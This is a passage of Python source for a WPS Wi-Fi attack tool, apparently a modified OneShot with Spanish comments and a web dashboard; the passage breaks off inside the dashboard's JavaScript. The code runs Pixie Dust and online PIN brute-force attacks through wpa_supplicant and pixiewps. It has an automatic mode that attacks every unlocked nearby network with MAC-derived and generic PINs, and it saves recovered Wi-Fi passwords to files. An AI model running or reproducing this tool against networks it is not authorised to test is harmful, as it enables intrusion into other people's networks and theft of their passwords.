                    print(f'{Colors.CYAN}[P]{Colors.WHITE} PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print(f'{Colors.CYAN}[P]{Colors.WHITE} AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print(f'{Colors.CYAN}[P]{Colors.WHITE} E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print(f'{Colors.CYAN}[P]{Colors.WHITE} E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                info('Scanning...')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            error('wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            info('Authenticating...')
        elif 'Authentication response' in line:
            success('Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            info('Associating with Access Point...')
        elif ('Conectado a' in line) or ('Connected to' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                success(f'Connected to {bssid} (ESSID: {self.connection_status.essid})')
            else:
                success(f'Connected to {bssid}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            info('Sending EAPOL Start...')
        elif 'EAP entering state IDENTITY' in line:
            info('Identity request received.')
        elif 'using real identity' in line:
            info('Sending identity response...')

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        info("Running Pixiewps...")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            info(f"Command: {cmd}")
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"\n{Colors.DIM}──────────────────────────────────────────{Colors.RESET}")
        success(f"{Colors.BOLD}Network{Colors.RESET}   : {essid}")
        success(f"{Colors.BOLD}Password{Colors.RESET}  : {wpa_psk}")
        success(f"{Colors.BOLD}WPS PIN{Colors.RESET}   : {wps_pin}")
        print(f"{Colors.DIM}──────────────────────────────────────────{Colors.RESET}\n")
          

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        success(f'Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        success(f'PIN saved in {filename}')

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'\n{Colors.CYAN}{"PINs generated for " + bssid:<80}{Colors.RESET}')
            print(f"{'#':<3} | {'PIN':<10} | {'Name'}")
            print(f"{Colors.CYAN}{'-'*80}{Colors.RESET}")
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} | {:<10} | {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input(f'{Colors.YELLOW}[?]{Colors.WHITE} Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    error('Invalid number!')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            warning(f'The only probable PIN is selected: {pin["name"]}')
            pin = pin['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   # Clean the pipe
        print(f"[\033[1;33m*\033[1;37m] Intentando PIN… '{pin}'…")
        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            if r == 'UNKNOWN COMMAND':
                print('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                      'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
            else:
                print('[\033[1;31m-\033[1;37m] Something went wrong — check out debug log')
            return False

        start_time = time.time()
        timeout = 60 # 60 seconds timeout
        while True:
            if time.time() - start_time > timeout:
                error('Tiempo de espera agotado (timeout) para la conexión WPS')
                break
            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False, auto=False):
        if not pin:
            if pixiemode:
                try:
                    # Try using the previously calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if not auto and input('[\033[1;33m?\033[1;37m] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                        elif auto:
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            else:
                # If not pixiemode, ask user to select a pin from the list
                if auto:
                    pin = self.generator.getLikely(bssid) or '12345670'
                else:
                    pin = self.__prompt_wpspin(bssid) or '12345670'

        if store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nhttps://github.com/Gtajisan…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            with open('conexiones.txt', 'a', encoding='utf-8') as f:
                f.write(f"BSSID: {bssid} | ESSID: {self.connection_status.essid} | Password: {self.connection_status.wpa_psk}\n")
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            # Try to remove temporary PIN file
            filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
            try:
                os.remove(filename)
            except FileNotFoundError:
                pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True, auto=auto)
                return False
            else:
                print('[\033[1;31m!\033[1;37m] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None):
        """
        @f_half — 4-character string
        """
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[\033[1;32m+\033[1;37m] First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[\033[1;31m!\033[1;37m] WPS transaction failed, re-trying last pin')
                return self.__first_half_bruteforce(bssid, f_half)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[\033[1;31m-\033[1;37m] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[\033[1;31m!\033[1;37m] WPS transaction failed, re-trying last pin')
                return self.__second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            # Trying to restore previous session
            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    if input('[\033[1;33m?\033[1;37m] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\n[\033[1;31m!\033[1;37m] Aborting…")
            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print('[\033[1;33m*\033[1;37m] Session saved in {}'.format(filename))
            if args.loop:
                raise KeyboardInterrupt

    def auto_connection(self, scanner, pixiemode=False, showpixiecmd=False, pixieforce=False, failed_bssids=None):
        if failed_bssids is None:
            failed_bssids = set()
        
        # Intentar desconectar para liberar el dispositivo antes del escaneo
        self.sendOnly('DISCONNECT')
        time.sleep(0.5)
        
        networks = scanner.iw_scanner()
        if not networks:
            return False

        already_connected = []
        if os.path.exists('conexiones.txt'):
            with open('conexiones.txt', 'r', encoding='utf-8') as f:
                content = f.read()
                already_connected = re.findall(r'BSSID: ([0-9A-F:]{17})', content, re.IGNORECASE)
                already_connected = [b.upper() for b in already_connected]

        for _, network in networks.items():
            bssid = network['BSSID'].upper()
            if bssid in already_connected:
                continue
            if bssid in failed_bssids:
                continue
            
            if network['WPS locked']:
                info(f'Saltando {bssid} ({network["ESSID"]}) - WPS está bloqueado (Locked)')
                failed_bssids.add(bssid)
                continue

            info(f'Intentando conectar a {bssid} ({network["ESSID"]})...')
            
            # Obtener todos los pines sugeridos para esta MAC
            suggested_pins = self.generator.getSuggested(bssid)
            tried_pins = set()
            
            # 1. Primero intentar los pines sugeridos por MAC
            for pin_data in suggested_pins:
                pin = pin_data['pin']
                if pin in tried_pins: continue
                
                info(f'Probando pin sugerido: {pin} ({pin_data["name"]})')
                if self.single_connection(bssid, pin=pin, pixiemode=False, auto=True):
                    success(f'¡Éxito con PIN {pin}!')
                    return True
                tried_pins.add(pin)

            # 2. Si no funcionaron o no hay sugeridos, intentar Pixie Dust si está activo
            if pixiemode:
                info(f'Intentando Pixie Dust en {bssid}...')
                if self.single_connection(bssid, pixiemode=True, showpixiecmd=showpixiecmd, pixieforce=pixieforce, auto=True):
                    return True

            # 3. Como último recurso en auto, si la red es marcada como vulnerable pero no hay pines específicos, 
            # intentar el pin genérico '12345670' o '00000000'
            for generic_pin in ['12345670', '00000000']:
                if generic_pin not in tried_pins:
                    info(f'Probando pin genérico: {generic_pin}')
                    if self.single_connection(bssid, pin=generic_pin, auto=True):
                        return True
            
            # Si nada funcionó, marcar como fallido para este escaneo
            failed_bssids.add(bssid)
        return False
    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup()


class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'ESSID': '',
                        'Level': -100,
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        cmd = 'iw dev {} scan'.format(self.interface)
        for i in range(3):
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
            lines = proc.stdout.splitlines()
            if lines and lines[0].startswith('command failed: Device or resource busy (-16)'):
                time.sleep(1)
                continue
            else:
                break
        
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # Filtering non-WPS networks
        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        # Sorting by Signal, then by vulnerability, then by lock status
        def sort_key(x):
            model = '{} {}'.format(x['Model'], x['Model number'])
            is_vuln = 1 if self.vuln_list and (model in self.vuln_list) else 0
            is_locked = 1 if x['WPS locked'] else 0
            # Higher signal (Level) is better, is_vuln is better, NOT locked is better
            return (is_locked, -is_vuln, -x['Level'])

        networks.sort(key=sort_key)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # Move cursor to top and clear screen efficiently
        sys.stdout.write("\033[H\033[J")
        show_banner()

        # Printing scanning results as table
        def truncateStr(s, length, postfix='…'):
            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        if self.vuln_list:
            print(f"{Colors.DIM}Legend: {Colors.GREEN}● Vulnerable {Colors.RED}● Locked {Colors.YELLOW}● Stored{Colors.RESET}\n")
        
        print(f"{Colors.DIM}{'ID':<4}  {'BSSID':<18}  {'ESSID':<25}  {'SEC':<8}  {'PWR':<4}  {'WPS'}{Colors.RESET}")

        network_list_items = list(network_list.items())
        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
            
        for n, network in network_list_items:
            id_str = f"{n}"
            essid = truncateStr(network['ESSID'], 25)
            wps_status = f"{Colors.RED}L{Colors.RESET}" if network['WPS locked'] else f"{Colors.GREEN}U{Colors.RESET}"
            line = f"{id_str:<4}  {network['BSSID']:<18}  {essid:<25}  {network['Security type']:<8}  {network['Level']:<4}   {wps_status}"
            
            if (network['BSSID'], network['ESSID']) in self.stored:
                print(f"{Colors.YELLOW}{line}{Colors.RESET}")
            elif network['WPS locked']:
                print(f"{Colors.DIM}{line}{Colors.RESET}")
            elif self.vuln_list and ('{} {}'.format(network['Model'], network['Model number']) in self.vuln_list):
                print(f"{Colors.BOLD}{line}{Colors.RESET}")
            else:
                print(line)

        return network_list

    def prompt_network(self) -> str:
        # Clear once at the start
        os.system('clear')
        while True:
            networks = self.iw_scanner()
            
            if not networks:
                sys.stdout.write("\033[H\033[J")
                show_banner()
                error('No networks found. Retrying...')
                time.sleep(0.5)
                continue
                
            print(f"{Colors.DIM}──────────────────────────────────────────{Colors.RESET}")
            sys.stdout.write(f'{Colors.BOLD}ID{Colors.RESET} {Colors.DIM}(0.5s refresh): {Colors.RESET}')
            sys.stdout.flush()
            
            rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
            if rlist:
                line = sys.stdin.readline().strip()
                if line.isdigit():
                    num = int(line)
                    if num in networks.keys():
                        return networks[num]['BSSID']
                    else:
                        error('Invalid ID')
                        time.sleep(1)
                elif line.lower() in ('q', 'x'):
                    sys.exit(0)
            else:
                continue


def check_and_disconnect(iface):
    # Check for active connection
    cmd = f"iw dev {iface} link"
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
    if "Not connected" not in proc.stdout:
        warning(f"Active connection detected on {iface}. Disconnecting for auditing...")
        subprocess.run(f"iw dev {iface} disconnect", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    return """
FARHAN 0.0.2 (c) 2017 rofl0r (modified).

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""


import json

GLOBAL_STATE = {
    'networks': {},
    'is_scanning': False,
    'current_attack': None,
    'last_scan_time': None,
    'scanner': None,
    'companion': None,
    'args': None
}

class WebHandler(BaseHTTPRequestHandler):
    def _send_json(self, data):
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def do_GET(self):
        if self.path == '/api/networks':
            self._send_json(list(GLOBAL_STATE['networks'].values()))
        elif self.path == '/api/logs':
            self._send_json(list(WEB_LOGS))
        elif self.path == '/api/status':
            self._send_json({
                'is_scanning': GLOBAL_STATE['is_scanning'],
                'current_attack': GLOBAL_STATE['current_attack']
            })
        elif self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(self._get_dashboard_html().encode())
        else:
            self.send_error(404)

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            params = json.loads(post_data)
        except:
            params = {}

        if self.path == '/api/scan':
            if not GLOBAL_STATE['is_scanning']:
                threading.Thread(target=self._bg_scan).start()
                self._send_json({'status': 'ok', 'message': 'Escaneo iniciado'})
            else:
                self._send_json({'status': 'error', 'message': 'Ya hay un escaneo en curso'})

        elif self.path == '/api/attack':
            bssid = params.get('bssid')
            if bssid and not GLOBAL_STATE['current_attack']:
                threading.Thread(target=self._bg_attack, args=(bssid,)).start()
                self._send_json({'status': 'ok', 'message': f'Ataque iniciado contra {bssid}'})
            else:
                self._send_json({'status': 'error', 'message': 'BSSID inválido o ataque en curso'})

        elif self.path == '/api/stop':
            # Implementar lógica para detener ataque si es posible
            self._send_json({'status': 'ok', 'message': 'Petición de parada enviada'})

    def _bg_scan(self):
        GLOBAL_STATE['is_scanning'] = True
        info("Escaneando redes desde la interfaz web...")
        try:
            nets = GLOBAL_STATE['scanner'].iw_scanner()
            if nets:
                GLOBAL_STATE['networks'] = nets
                success(f"Encontradas {len(nets)} redes")
        except Exception as e:
            error(f"Error en escaneo web: {e}")
        GLOBAL_STATE['is_scanning'] = False

    def _bg_attack(self, bssid):
        GLOBAL_STATE['current_attack'] = bssid
        info(f"Iniciando ataque web contra {bssid}...")
        try:
            args = GLOBAL_STATE['args']
            if not GLOBAL_STATE['companion']:
                GLOBAL_STATE['companion'] = Companion(args.interface, args.write, print_debug=args.verbose)
            
            GLOBAL_STATE['companion'].single_connection(
                bssid, 
                pixiemode=args.pixie_dust, 
                showpixiecmd=args.show_pixie_cmd, 
                pixieforce=args.pixie_force, 
                auto=True
            )
        except Exception as e:
            error(f"Error en ataque web: {e}")
        GLOBAL_STATE['current_attack'] = None

    def _get_dashboard_html(self):
        return r"""
        <!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <title>WPS Auditor PRO</title>
            <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
            <style>
                :root {
                    --primary: #00ffa3;
                    --primary-dim: rgba(0, 255, 163, 0.1);
                    --bg: #050505;
                    --card: #111111;
                    --border: #222222;
                    --text: #ffffff;
                    --text-dim: #888888;
                    --danger: #ff4444;
                    --info: #00e5ff;
                }
                * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
                body { 
                    font-family: 'Inter', sans-serif; 
                    background: var(--bg); 
                    color: var(--text); 
                    margin:0; 
                    padding: 0;
                    overflow-x: hidden;
                }
                .header { 
                    padding: 15px 20px; 
                    background: rgba(17, 17, 17, 0.8); 
                    backdrop-filter: blur(10px);
                    border-bottom: 1px solid var(--border); 
                    display: flex; 
                    justify-content: space-between; 
                    align-items: center;
                    position: sticky;
                    top: 0;
                    z-index: 100;
                }
                .logo { font-size: 18px; font-weight: 800; letter-spacing: -0.5px; }
                .logo span { color: var(--primary); }
                
                .btn { 
                    padding: 10px 18px; 
                    border-radius: 8px; 
                    border:none; 
                    cursor:pointer; 
                    font-weight: 700; 
                    font-size: 13px;
                    transition: all 0.2s ease; 
                    text-transform: uppercase;
                }
                .btn-scan { background: var(--primary); color: #000; box-shadow: 0 4px 15px var(--primary-dim); }
                .btn-scan:active { transform: scale(0.95); }
                .btn-scan:disabled { background: var(--border); color: var(--text-dim); cursor: not-allowed; }

                .container { padding: 15px; display: flex; flex-direction: column; gap: 20px; }
                
                .card { 
                    background: var(--card); 
                    border-radius: 12px; 
                    padding: 15px; 
                    border: 1px solid var(--border); 
                }
                .card-title { 
                    margin: 0 0 15px 0; 
                    font-size: 14px; 
                    color: var(--text-dim); 
                    text-transform: uppercase; 
                    letter-spacing: 1px;
                    display: flex;
                    align-items: center;
                    gap: 8px;
                }
                .card-title::before { content: ''; width: 3px; height: 14px; background: var(--primary); border-radius: 2px; }

                /* Grid de Redes adaptativo */
                .networks-grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
                @media (min-width: 768px) { .networks-grid { grid-template-columns: repeat(2, 1fr); } }
                @media (min-width: 1200px) { .networks-grid { grid-template-columns: repeat(3, 1fr); } }

                .net-item {
                    background: #181818;
                    border: 1px solid var(--border);
                    border-radius: 10px;
                    padding: 12px;
                    display: flex;
                    flex-direction: column;
                    gap: 10px;
                    transition: border-color 0.2s;
                }
                .net-item:hover { border-color: #333; }
                .net-main { display: flex; justify-content: space-between; align-items: flex-start; }
                .net-info { flex: 1; }
                .net-essid { font-weight: 700; font-size: 15px; margin-bottom: 2px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 200px; }
                .net-bssid { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-dim); }
                
                .net-stats { display: flex; gap: 10px; font-size: 11px; font-weight: 600; }
                .badge { padding: 2px 6px; border-radius: 4px; background: #222; }
                .badge.vuln { color: var(--primary); background: var(--primary-dim); }
                .badge.locked { color: var(--danger); background: rgba(255, 68, 68, 0.1); }
                
                .pwr-bar { width: 40px; height: 4px; background: #222; border-radius: 2px; position: relative; overflow: hidden; }
                .pwr-val { height: 100%; background: var(--primary); border-radius: 2px; }

                .btn-attack { 
                    width: 100%; 
                    background: #2196F3; 
                    color: #fff; 
                    padding: 8px; 
                    border-radius: 6px; 
                    font-size: 12px; 
                    font-weight: 700;
                    border: none;
                }

                .logs-container { 
                    background: #000; 
                    color: #00ff41; 
                    font-family: 'JetBrains Mono', monospace; 
                    height: 250px; 
                    overflow-y: auto; 
                    padding: 12px; 
                    font-size: 11px; 
                    border-radius: 8px;
                    border: 1px solid var(--border);
                    line-height: 1.5;
                }
                .log-line { margin-bottom: 4px; border-bottom: 1px solid #080808; padding-bottom: 2px; }
                .log-time { color: #555; margin-right: 8px; }

                ::-webkit-scrollbar { width: 4px; }
                ::-webkit-scrollbar-track { background: transparent; }
                ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
            </style>
        </head>
        <body>
            <div class="header">
                <div class="logo">WPS<span>AUDITOR</span></div>
                <button class="btn btn-scan" onclick="startScan()" id="scanBtn">ESCANEAR</button>
            </div>
            
            <div class="container">
                <div class="card">
                    <div class="card-title">Consola de Eventos</div>
                    <div class="logs-container" id="logs"></div>
                </div>

                <div class="card">
                    <div class="card-title">Redes en el área</div>
                    <div id="networksList" class="networks-grid">
                        <div style="color: var(--text-dim); font-size: 13px; padding: 20px; text-align: center; width: 100%;">
                            Pulsa ESCANEAR para buscar redes...
                        </div>
                    </div>
                </div>
            </div>

            <script>
                async function startScan() {
                    const btn = document.getElementById('scanBtn');
                    btn.disabled = true;
                    btn.innerText = 'Buscando...';
                    await fetch('/api/scan', {method: 'POST'});
                }

                async function attack(bssid) {
                    if(!confirm('¿Atacar ' + bssid + '?')) return;
                    await fetch('/api/attack', {
                        method: 'POST',
                        body: JSON.stringify({bssid: bssid})
                    });
                }

                function updateLogs() {
                    fetch('/api/logs').then(r => r.json()).then(logs => {
                        const div = document.getElementById('logs');
